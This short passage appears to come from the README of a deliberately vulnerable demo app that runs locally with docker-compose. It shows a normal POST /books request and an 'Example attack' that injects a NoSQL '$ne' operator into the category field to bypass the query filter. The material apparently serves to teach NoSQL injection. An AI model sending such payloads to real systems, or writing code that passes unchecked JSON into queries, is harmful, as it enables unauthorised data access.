- `docker-compose up --build`
- Access to http://localhost:5000/

## Example request:
```http
POST /books HTTP/1.1
Host: localhost:5000
Content-Type: application/json
Accept-Language: en-US
Accept: */*
Accept-Encoding: gzip, deflate, br
Connection: keep-alive
Content-Length: 25

{
  "category":"classic"
}
```

## Example attack:
```http
POST /books HTTP/1.1
Host: localhost:5000
Content-Type: application/json
Accept-Language: en-US
Accept: */*
Accept-Encoding: gzip, deflate, br
Connection: keep-alive
Content-Length: 25

{
  "category":{
    "$ne":""
  }
}
```
